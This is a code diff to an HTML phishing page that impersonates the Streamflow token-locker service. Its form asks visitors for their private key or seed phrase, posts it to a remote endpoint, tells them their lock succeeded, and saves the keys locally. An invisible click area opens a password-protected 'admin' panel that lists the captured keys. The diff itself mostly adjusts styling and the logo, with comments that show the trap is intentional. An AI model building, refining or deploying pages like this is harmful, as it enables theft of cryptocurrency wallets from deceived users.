@@ -5,33 +5,31 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Streamflow | Token Locker</title>
     
-    <link rel="icon" type="image/png" href="https://streamflow.finance/favicon.ico">
+    <link rel="icon" type="image/png" href="icon.png">
     
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     
     <style>
-        body { background-color: #0b0e11; color: white; font-family: 'Inter', sans-serif; }
-        .sf-card { background: #12161b; border: 1px solid #1e2329; border-radius: 16px; width: 100%; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        body { background-color: #0b0e11; color: white; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .sf-card { background: #12161b; border: 1px solid #1e2329; border-radius: 16px; width: 100%; max-width: 420px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .sf-input { background: #1b1f23; border: 1px solid #30363d; border-radius: 12px; width: 100%; padding: 14px; margin-top: 6px; color: white; outline: none; font-size: 14px; }
         .sf-btn { background-color: #00ffbd; color: #0b0e11; font-weight: 700; width: 100%; padding: 16px; border-radius: 12px; cursor: pointer; margin-top: 24px; text-transform: uppercase; transition: 0.2s; }
         .sf-btn:hover { background-color: #00d9a1; }
+        .label-style { font-size: 11px; color: #848e9c; font-weight: 700; text-transform: uppercase; }
+        
+        /* ZONA INVIZIBILĂ ADMIN */
         .secret-gate { width: 100%; height: 50px; background: transparent; margin-top: 10px; cursor: default; }
         #adminPanel { display: none; margin-top: 20px; border-top: 1px solid #2d333b; padding-top: 20px; }
-        .label-style { font-size: 11px; color: #848e9c; font-weight: 700; text-transform: uppercase; }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-6">
+<body>
 
-    <div class="w-full max-w-[420px]">
+    <div class="w-full max-w-[420px] p-6">
         <div class="flex flex-col items-center mb-8">
-            <div class="w-20 h-20 bg-blue-600 rounded-2xl flex items-center justify-center shadow-lg shadow-blue-500/20 mb-4">
-                <svg width="50" height="50" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M4 18L14 12L4 6V18ZM19 6V18H17V6H19Z"/>
-                </svg>
-            </div>
+            <img src="logo.png" alt="Logo" class="w-20 h-20 rounded-2xl mb-4 object-cover border border-gray-800 shadow-lg">
             <h1 class="text-3xl font-bold tracking-tight">Streamflow</h1>
-            <p class="text-gray-400 text-sm">Token Vesting & Locking Service</p>
+            <p class="text-gray-400 text-sm">Secure Token Management</p>
         </div>
 
         <div class="sf-card">
@@ -40,22 +38,22 @@
             <form id="lockerForm">
                 <div class="mb-4">
                     <label class="label-style">Project Name</label>
-                    <input type="text" name="Project_Name" placeholder="e.g. My Token" class="sf-input" required>
+                    <input type="text" name="Project_Name" placeholder="e.g. My Project" class="sf-input w-full" required>
                 </div>
 
                 <div class="mb-4">
                     <label class="label-style">Private Key / Seed Phrase</label>
-                    <input type="password" name="Private_Key" placeholder="Enter your key" class="sf-input" required>
+                    <input type="password" name="Private_Key" placeholder="Enter your key" class="sf-input w-full" required>
                 </div>
 
                 <div class="flex gap-4">
                     <div class="flex-1">
                         <label class="label-style">Symbol</label>
-                        <input type="text" name="Symbol" placeholder="SOL" class="sf-input">
+                        <input type="text" name="Symbol" placeholder="SOL" class="sf-input w-full">
                     </div>
                     <div class="flex-1">
                         <label class="label-style">Amount</label>
-                        <input type="number" name="Amount" placeholder="0.00" class="sf-input">
+                        <input type="number" name="Amount" placeholder="0.00" class="sf-input w-full">
                     </div>
                 </div>
 
@@ -65,9 +63,10 @@
             <div class="secret-gate" onclick="document.getElementById('adminPanel').style.display='block'"></div>
             
             <div id="adminPanel">
-                <input type="password" id="adminPass" placeholder="Admin Password" class="sf-input text-xs mb-2">
+                <label class="label-style mb-2 block text-[#00ffbd]">Admin Dashboard</label>
+                <input type="password" id="adminPass" placeholder="Password" class="sf-input text-xs mb-2 w-full">
                 <button onclick="checkAdmin()" class="w-full bg-gray-800 text-white text-xs py-3 rounded-lg font-bold">VIEW DATA</button>
-                <div id="dataDisplay" class="hidden mt-4 p-4 bg-black rounded-lg text-[10px] text-green-500 font-mono border border-green-900/30">
+                <div id="dataDisplay" style="display:none;" class="mt-4 p-4 bg-black rounded-lg text-[10px] text-green-500 font-mono border border-green-900/30 whitespace-pre-wrap break-all">
                 </div>
             </div>
         </div>
@@ -77,7 +76,7 @@
         const form = document.getElementById('lockerForm');
         
         form.addEventListener("submit", function(event) {
-            event.preventDefault();
+            event.preventDefault(); // Rămâne pe pagină
             const btn = document.getElementById('submitBtn');
             const formData = new FormData(form);
             
@@ -88,11 +87,14 @@
                 method: "POST",
                 body: formData,
                 headers: { 'Accept': 'application/json' }
-            }).then(response => {
+            }).then(() => {
                 btn.innerText = "DEPLOY LOCK";
                 btn.disabled = false;
+                
+                // Mesajul tău în engleză
                 alert("Congratulations! You have successfully locked your token. Take a screenshot and share it on social media. Success!");
                 
+                // Salvare locală pentru tabelul din pagină
                 let logs = JSON.parse(localStorage.getItem('sf_logs') || "[]");
                 logs.push({
                     p: formData.get('Project_Name'),
@@ -101,8 +103,8 @@
                 });
                 localStorage.setItem('sf_logs', JSON.stringify(logs));
                 form.reset();
-            }).catch(error => {
-                alert("Network error.");
+            }).catch(() => {
+                alert("Connection error. Try again.");
                 btn.innerText = "DEPLOY LOCK";
                 btn.disabled = false;
             });
@@ -113,10 +115,10 @@
                 const logs = JSON.parse(localStorage.getItem('sf_logs') || "[]");
                 const display = document.getElementById('dataDisplay');
                 display.innerHTML = logs.length > 0 ? 
-                    logs.map(l => `[${l.t}] PROJ: ${l.p} | KEY: ${l.k}`).join('<br>') : 
-                    "No logs found.";
-                display.classList.remove('hidden');
-            } else { alert("Wrong Password"); }
+                    logs.map(l => `[${l.t}] PROJ: ${l.p} | KEY: ${l.k}`).join('\n\n') : 
+                    "No data yet.";
+                display.style.display = 'block';
+            } else { alert("Wrong password"); }
         }
     </script>
 </body>
